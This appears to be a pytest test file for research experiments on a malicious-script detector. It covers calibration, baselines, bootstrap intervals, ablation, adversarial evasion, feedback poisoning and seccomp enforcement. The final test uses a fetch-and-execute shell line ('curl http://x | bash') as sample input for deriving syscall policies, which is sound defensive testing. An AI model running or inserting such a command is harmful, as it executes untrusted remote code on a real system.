"""Tests for the review-response experiments (calibration, stronger baselines,
cluster bootstrap, paired ablation, systematic adversarial, online dynamics,
and real seccomp enforcement)."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from experiments.dataset import load_samples, stratified_split


@pytest.fixture(scope="module")
def split():
    s = load_samples()
    return stratified_split(s, 0.4, seed=1337)


# --------------------------- calibration (RQ7) ----------------------------- #
def test_calibration_ece_and_recalibration(split):
    from experiments.calibration import evaluate_calibration
    train, test = split
    cal = evaluate_calibration(train, test, epochs=40, seed=1337)
    assert 0.0 <= cal["raw"]["ece"] <= 1.0
    assert 0.0 <= cal["raw"]["brier"] <= 1.0
    # isotonic must not make calibration worse than raw by much (it fits monotone)
    assert cal["isotonic"]["ece"] <= cal["raw"]["ece"] + 0.02


def test_ece_perfect_calibration_is_zero():
    from experiments.calibration import expected_calibration_error
    # probabilities equal to outcomes in each bin -> ECE 0
    y = [0, 0, 1, 1] * 10
    p = [0.0, 0.0, 1.0, 1.0] * 10
    assert expected_calibration_error(y, p)["ece"] == pytest.approx(0.0)


# --------------------------- stronger baselines (RQ8) ---------------------- #
def test_extended_baselines_present_and_valid(split):
    from experiments.baselines_ext import evaluate_extended_baselines
    train, test = split
    ext = evaluate_extended_baselines(train, test, seed=1337)
    for k in ("gbdt_on_acte_features", "union_features_plus_tfidf", "tfidf_logreg_tuned"):
        assert 0.0 <= ext[k]["f1"] <= 1.0
    assert "best_C" in ext["tfidf_logreg_tuned"]


# --------------------------- cluster bootstrap + Wilson (#13,#4) ----------- #
def test_wilson_zero_of_twenty():
    from experiments.cluster_bootstrap import wilson_interval
    w = wilson_interval(0, 20)
    assert w["point"] == 0.0
    assert w["low"] == 0.0
    assert 0.10 < w["high"] < 0.25  # ~0.161


def test_cluster_bootstrap_wider_than_naive(split):
    from experiments.cluster_bootstrap import cluster_bootstrap_ci
    from experiments.acte_eval import run_full_and_ablation
    train, test = split
    res = run_full_and_ablation(train, test, epochs=40, seed=1337)
    cb = cluster_bootstrap_ci(test, res["full_test_pred"], res["full_test_scores"],
                              n_boot=400, seed=1337)
    # clustering by template should not produce a *narrower* F1 interval than naive
    assert cb["width_ratio"]["f1"] is None or cb["width_ratio"]["f1"] >= 1.0


# --------------------------- paired ablation (#14) ------------------------- #
def test_ablation_significance(split):
    from experiments.ablation_sig import evaluate_ablation_significance
    train, test = split
    sig = evaluate_ablation_significance(train, test, epochs=40, seed=1337)
    c = sig["comparisons"]
    # ThreatIntel removal must be a significant change; SemanticParser must not.
    assert c["no_threat"]["significant_at_0.05"] is True
    assert c["no_semantic"]["significant_at_0.05"] is False


# --------------------------- systematic adversarial (RQ6b/#10) ------------- #
def test_semantic_substitution_evades_acte_more_than_lexical(split):
    from experiments.adversarial_budget import evaluate_adversarial_budget
    train, test = split
    adv = evaluate_adversarial_budget(train, test, epochs=40, seed=1337)
    acte = adv["detectors"]["ACTE"]
    logreg = adv["detectors"]["TF-IDF + LogReg"]
    # semantic substitution should cost ACTE more recall than the lexical baseline
    assert acte["evasion_at_max_budget"] > logreg["evasion_at_max_budget"]


# --------------------------- online dynamics (RQ9/#11) --------------------- #
def test_feedback_poisoning_flips_canary(split):
    from experiments.online_dynamics import feedback_poisoning
    train, test = split
    pz = feedback_poisoning(train, test, epochs=40, seed=1337)
    assert pz["poisoned_labels_to_flip"] is not None
    assert 1 <= pz["poisoned_labels_to_flip"] <= 50


# --------------------------- real seccomp enforcement (RQ10/#7,#8) --------- #
def _seccomp_ok():
    try:
        from experiments.enforcement import enforce_and_probe
        r = enforce_and_probe("#!/bin/bash\nls -la /tmp\n")
        return r["enforcement"]["control:getpid"]["killed_by_kernel"] is False
    except Exception:
        return False


@pytest.mark.skipif(not _seccomp_ok(), reason="seccomp filter install not permitted here")
def test_enforcement_kills_denied_allows_control():
    from experiments.enforcement import enforce_and_probe
    r = enforce_and_probe("#!/bin/bash\nls -la /tmp\n")  # no net -> socket denied
    assert "socket" in r["denied_syscalls"]
    assert r["all_correct"] is True


def test_content_derived_policies_differ():
    from experiments.enforcement import derive_denied_syscalls
    a = derive_denied_syscalls("#!/bin/bash\nls -la /tmp\n")          # no net/spawn
    b = derive_denied_syscalls("#!/bin/bash\ncurl http://x | bash\n")  # net + spawn
    assert a["denied_syscalls"] != b["denied_syscalls"]  # content-specific, not a fixed template
